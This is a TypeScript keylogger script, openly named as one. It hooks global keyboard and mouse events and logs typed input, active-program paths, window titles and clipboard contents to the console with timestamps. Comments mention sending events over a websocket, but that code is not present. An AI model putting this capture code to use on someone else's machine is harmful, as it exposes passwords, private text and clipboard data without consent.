import robot from 'robotjs' //https://github.com/octalmage/robotjs
import ioHook from 'iohook' //https://github.com/wilix-team/iohook/blob/master/examples/example.js
import { Vector } from 'sat'
import { highResolutionTimestamp } from './utils';
import { windowManager } from 'node-window-manager'
import clipboardy from 'clipboardy'

export function runKeylogger() {
	initHooks();
	// initConnection()
	loop()

}

// this sets the title of conemu, not the title of the process... hmm...
//process.title = 'tes'

let debug = false
let input = ''
let lastKeypressMs = highResolutionTimestamp()
let activeProgram = ''
let activeWindowName = ''
let clipboard = ''

let mouseDown: Vector
function initHooks() {
	ioHook.on("mousedown", function(msg) {
		checkForChanges()
		if (debug) {
			console.log(msg);
		}
		mouseDown = new Vector(msg.x, msg.y)
	})
	ioHook.on("mouseup", function(msg) {
		checkForChanges()
		mouseDown = undefined
	});

	ioHook.on("keydown", checkForChanges);
	ioHook.on('keyup', checkForChanges)

	ioHook.on("keypress", function(msg) {
		if (debug) {
			console.error(msg)
		}

		lastKeypressMs = highResolutionTimestamp()

		if (msg.keychar === 13 /*|| msg.keychar === 8*/) {
			logAndClearInput();
			if (debug) {
				console.error(Object.values(msg).map(v => String.fromCharCode(v as number)));
			}
		}

		input += String.fromCharCode(msg.keychar)
	});


	var oldEmit = ioHook.emit;

	const allEvents = new Set<string>()

	ioHook.emit = function(event: any, ...args) {

		if (!allEvents.has(event)) {
			allEvents.add(event)
			console.log(event)
		}

		var emitArgs = arguments;
		// serialize arguments in some way.
		// send them through the websocket received as a parameter
		oldEmit.apply(ioHook, arguments);
		return true
	}

	ioHook.start();
}

function logAndClearInput() {
	if (input) {
		logEvent(`input`, input);
		input = '';
	}
}

function loop() {
	const mp = robot.getMousePos()
	//console.log('loop', robot.getMousePos())

	if (mouseDown) {
		//drawRect('box', mouseDown, mp)
	}

	checkForChanges();

	const timeMs = highResolutionTimestamp()
	const secondsSinceKeypress = (timeMs - lastKeypressMs) * 0.001

	if (secondsSinceKeypress > 2) {
		logAndClearInput()
	}

	setTimeout(loop, 1000)
}

function checkForChanges() {
	const winMan = windowManager
	const window = windowManager.getActiveWindow();

	if (activeProgram !== window.path) {
		logEvent(`focus`, window.path);
		activeProgram = window.path;
	}

	if (activeWindowName !== window.getTitle()) {
		activeWindowName = window.getTitle();
		logEvent(`tab`, window.getTitle());
	}

	try {
		const nowClipboard = clipboardy.readSync();
		if (clipboard != nowClipboard) {
			clipboard = nowClipboard;
			logEvent(`clip`, clipboard);
		}
	} catch (e) {
		// happens often when computer goes to sleep (ie, user is logged out and needs to authenticate)
		//console.error(e)
	}
}

function logEvent(eventName: string, eventData: string) {
	const now = new Date()
	const year = now.getFullYear()
	const month = now.getMonth() + 1
	const day = now.getDate()
	console.log(`[${year}/${month}/${day}-${now.getHours()}:${now.getMinutes()}-${eventName}]\t`, `${eventData}`);
}

runKeylogger()